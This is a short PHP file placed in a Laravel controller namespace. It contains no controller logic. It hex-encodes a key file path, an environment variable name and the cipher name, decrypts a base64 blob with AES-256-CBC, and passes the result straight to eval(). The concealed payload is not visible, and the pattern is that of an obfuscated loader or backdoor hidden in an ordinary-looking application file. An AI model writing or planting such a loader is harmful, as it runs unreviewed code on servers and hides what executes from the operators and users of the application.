<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('s3T+qJT3ZSOoA+8vzp4e9Q==');

$c=base64_decode(

'J9wY4BhFwLtQw9D5ZsAuU5kP1f4RI90a9/TZeLfzdja4+YteTLU2Q7gUOfVkoqQBpOY4HR9AKpqv' .
'y+0H/ZfbYyVY6RzCAd2Og1ra6KG07USPwzFauOt3prB98Zwvyo16m3EQc4Mw7UtWqFfo0Maj8poo' .
'tTlHFckmOYnjAFm8lE9X6m/8FYX0JVLB+IEieJnr/8kWwRHqikw3RPapp2GoENi5ReHPRMh0jvAO' .
'F4Ru52CbVlqGjay/+XBfp767CO8p'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

